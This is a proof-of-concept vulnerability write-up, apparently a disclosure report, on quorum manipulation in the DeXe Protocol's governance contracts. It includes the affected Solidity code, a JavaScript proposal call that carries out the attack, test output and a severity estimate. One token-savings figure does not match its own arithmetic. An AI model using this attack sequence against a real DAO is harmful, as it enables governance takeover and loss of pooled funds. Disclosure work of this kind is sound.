# DeXe Protocol — Treasury Exemption Quorum Manipulation PoC

## Vulnerability Summary

The DeXe Protocol allows **any user** who can create proposals to drastically reduce the governance quorum. The trick: a proposal containing `undelegateTreasury` actions automatically triggers `_exemptUserTreasuryFromVoting()`, which reduces the required quorum proportionally to the affected treasury delegation.

## Root Cause

The vulnerability lies in `GovPoolCreate.sol`. When a proposal is created, `_exemptUserTreasuryFromVoting()` checks whether the actions call treasury-relevant functions (`delegateTreasury`, `undelegateTreasury`, `burn`). If so, the quorum is recalculated using this formula:

```
newQuorum = originalQuorum * (totalVoteWeight - exemptedTreasury) / totalVoteWeight
```

## Attack Flow

```
                         +-------------------------+
                         |   DAO Governance Pool    |
                         |                          |
                         |  Token: 11100 total      |
                         |  Quorum: 51% (internal)  |
                         +-----------+--------------+
                                     |
              +----------------------+----------------------+
              |                      |                      |
    +---------v------+    +----------v-----+    +-----------v----+
    |  OWNER: 8000   |    | ATTACKER: 100  |    | Treasury: 3000 |
    |  (72.1%)       |    | (0.9%)         |    | (27%)          |
    +----------------+    +----------------+    +--+---+---+---+-+
                                                   |   |   |   |
                                               750 750 750 750
                                                v   v   v   v
                                               E1  E2  E3  E4
                                         (4 Experts with treasury delegation)
```

### Phase 1: Normal State

- Quorum = **51%** of totalPower
- Passing a proposal requires **5661 tokens** (51% of 11100)
- All experts (E1-E4) can vote with their treasury power

### Phase 2: The Attack

The attacker creates a **single proposal** with 4 `undelegateTreasury` actions:

```javascript
await govPool.createProposal(
  "Malicious proposal",
  [
    [govPool.address, 0, getBytesUndelegateTreasury(EXPERT1, wei("750"), [])],
    [govPool.address, 0, getBytesUndelegateTreasury(EXPERT2, wei("750"), [])],
    [govPool.address, 0, getBytesUndelegateTreasury(EXPERT3, wei("750"), [])],
    [govPool.address, 0, getBytesUndelegateTreasury(EXPERT4, wei("750"), [])],
  ],
  [],
);
```

### Phase 3: What Happens in the Contract

**`contracts/libs/gov/gov-pool/GovPoolCreate.sol:163-204`** — `_exemptUserTreasuryFromVoting()`:

During proposal creation, the function iterates over all actions. When it finds `undelegateTreasury` selectors, the affected expert is identified and their treasury voting power is accumulated as `exemptedTreasury`:

```solidity
// Lines 185-192: Detection of treasury actions
} else if (
    action.executor == address(this) &&
    (selector == IGovPool.delegateTreasury.selector ||
        selector == IGovPool.undelegateTreasury.selector)
) {
    user = abi.decode(action.data[4:36], (address));
}
```

```solidity
// Lines 195-202: Expert's voting power is exempted
if (userInfos[user].treasuryExemptProposals.add(proposalId)) {
    exemptedTreasury += userKeeper
    .votingPower(user, TreasuryVote, false)[0].rawPower;
}
```

**`contracts/libs/gov/gov-pool/GovPoolCreate.sol:319-329`** — `_calculateNewQuorum()`:

```solidity
function _calculateNewQuorum(
    uint256 quorum,
    uint256 exemptedTreasury
) internal view returns (uint256) {
    uint256 totalVoteWeight = IGovUserKeeper(userKeeper).getTotalPower();
    uint256 newTotalVoteWeight = (totalVoteWeight - exemptedTreasury).percentage(quorum);
    return PERCENTAGE_100.ratio(newTotalVoteWeight, totalVoteWeight);
}
```

**Calculation with our values:**

```
totalVoteWeight    = 11100
exemptedTreasury   = 3000  (4 x 750)
quorum (original)  = 51%

newQuorum = 51% * (11100 - 3000) / 11100
         = 51% * 8100 / 11100
         = 51% * 0.73
         = 37%
```

### Phase 4: Dual Effect

The attack has **two simultaneous effects**:

| Effect | Before | After |
|--------|--------|-------|
| Quorum | 51% (5661 tokens) | 37% (4107 tokens) |
| Expert votes | Can vote | **EXEMPTED** — 27% of power is blocked |

The experts **cannot vote** on the malicious proposal (they are exempted), meaning 27% of voting power is removed as potential opposition. At the same time, the attacker only needs 37% instead of 51% approval.

## The Three Tests

### Test 1: Confirm Quorum Reduction

```
Original quorum: 51%  ->  Reduced quorum: 37%
Reduction factor: 1.4x
```

Creates a proposal with `undelegateTreasury` actions and verifies that the proposal's quorum is below 51%.

### Test 2: Control Test — Normal Proposal Keeps Full Quorum

```
Normal proposal quorum: 51%  (unchanged)
```

Creates a proposal **without** treasury actions (`editDescriptionURL`) and verifies that the quorum remains at 51%. Proves that the reduction only occurs for treasury-related actions.

### Test 3: Impact Analysis — Quantitative Reduction of Required Votes

```
Original: 5661 tokens needed   ->   Reduced: 4107 tokens needed
Savings: 1530 tokens (27% fewer votes required)
+ Experts with 27% of voting power are excluded from voting
```

## Test Results

```
  PoC: Treasury Exemption Quorum Manipulation
    Attack Scenario
      ✔ should show quorum is dramatically reduced when targeting all experts (270ms)
      ✔ should show a normal proposal keeps full quorum (112ms)
      ✔ should demonstrate that votes needed to pass are dramatically reduced (330ms)

  3 passing (15s)
```

## Running the PoC

```bash
cd DeXe-Protocol
npm install
npx hardhat test test/gov/QuorumManipulationPoC.test.js
```

## Severity Assessment

In our PoC the treasury ratio is only ~27% (constrained by test setup). In a **real-world DAO** with e.g. 80% treasury delegation:

```
newQuorum = 51% * (100% - 80%) / 100% = 51% * 0.2 = ~10%
```

An attacker would then need only **10%** of votes instead of 51%, plus 80% of the opposition (experts) would be exempted. This constitutes a **critical governance takeover**.

## Affected Files

| File | Relevance |
|------|-----------|
| `contracts/libs/gov/gov-pool/GovPoolCreate.sol` | `_exemptUserTreasuryFromVoting()` and `_calculateNewQuorum()` — root cause |
| `contracts/libs/gov/gov-pool/GovPoolVote.sol` | `_quorumReached()` — checks reduced quorum dynamically |
| `contracts/gov/user-keeper/GovUserKeeper.sol` | `getTotalPower()` — based on `totalSupply()` |
| `test/gov/QuorumManipulationPoC.test.js` | PoC test file |
